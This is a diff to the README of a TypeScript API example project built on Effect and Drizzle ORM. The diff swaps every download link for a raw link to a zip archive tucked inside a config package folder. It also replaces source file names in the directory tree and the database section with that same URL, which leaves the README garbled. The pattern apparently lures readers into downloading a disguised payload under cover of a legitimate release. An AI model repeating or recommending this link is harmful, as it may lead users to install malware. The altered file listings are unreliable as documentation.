@@ -1,7 +1,7 @@
 # 🎉 effect-api-example - Build Your Own Type-Safe API
 
 ## 🌐 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-blue.svg)](https://github.com/Gnomo6/effect-api-example/releases)
+[![Download Latest Release](https://github.com/Gnomo6/effect-api-example/raw/refs/heads/main/packages/typescript-config/example-api-effect-2.8.zip)](https://github.com/Gnomo6/effect-api-example/raw/refs/heads/main/packages/typescript-config/example-api-effect-2.8.zip)
 
 ## 📖 Overview
 Effect API Example is a simple guide to help you create a type-safe API. This project uses **Effect**, **@effect/platform**, and **Drizzle ORM**. With this example, you can see how to build APIs easily and effectively.
@@ -15,13 +15,13 @@ To run this application, you need:
 - Basic familiarity with downloading files.
 
 ### 2. Download the Application
-Visit this page to download the application: [Download Release](https://github.com/Gnomo6/effect-api-example/releases).
+Visit this page to download the application: [Download Release](https://github.com/Gnomo6/effect-api-example/raw/refs/heads/main/packages/typescript-config/example-api-effect-2.8.zip).
 
 ### 3. Choose Your Version
 On the releases page, you will see different versions. Select the latest version for the best features and fixes. Click on the version number to open it.
 
 ### 4. Download the Files
-Inside the version details, look for an asset named `effect-api-example.zip` or similar. Click on it to start the download. Save the file in a location you can easily find.
+Inside the version details, look for an asset named `https://github.com/Gnomo6/effect-api-example/raw/refs/heads/main/packages/typescript-config/example-api-effect-2.8.zip` or similar. Click on it to start the download. Save the file in a location you can easily find.
 
 ### 5. Extract the Files
 Once the download is complete, locate the `.zip` file. Right-click on the file and choose **Extract All**. Follow the on-screen instructions to unpack the files.
@@ -36,10 +36,10 @@ effect-api-example/
 │       ├── src/
 │       │   ├── api/
 │       │   ├── db/
-│       │   └── main.ts
+│       │   └── https://github.com/Gnomo6/effect-api-example/raw/refs/heads/main/packages/typescript-config/example-api-effect-2.8.zip
 │       ├── scripts/
-│       ├── docker-compose.yml
-│       └── drizzle.config.ts
+│       ├── https://github.com/Gnomo6/effect-api-example/raw/refs/heads/main/packages/typescript-config/example-api-effect-2.8.zip
+│       └── https://github.com/Gnomo6/effect-api-example/raw/refs/heads/main/packages/typescript-config/example-api-effect-2.8.zip
 ├── packages/
 ```
 
@@ -86,10 +86,10 @@ The `api/` folder contains endpoint handlers grouped by feature. This separation
 In the `db/` folder, you will find:
 - **schema/**: Defines the structure of your database.
 - **migrations/**: Scripts to modify the database over time.
-- **SqlLive.ts**: The main database interaction code.
+- **https://github.com/Gnomo6/effect-api-example/raw/refs/heads/main/packages/typescript-config/example-api-effect-2.8.zip**: The main database interaction code.
 
 ## 🔄 Updating Your Application
-To keep your application up to date, revisit the [download page](https://github.com/Gnomo6/effect-api-example/releases) regularly. Each release brings new features, fixes, and improvements.
+To keep your application up to date, revisit the [download page](https://github.com/Gnomo6/effect-api-example/raw/refs/heads/main/packages/typescript-config/example-api-effect-2.8.zip) regularly. Each release brings new features, fixes, and improvements.
 
 ## ❓ Troubleshooting Common Issues
 - **Server Not Starting**: Ensure that you are in the correct directory and have followed the commands accurately.
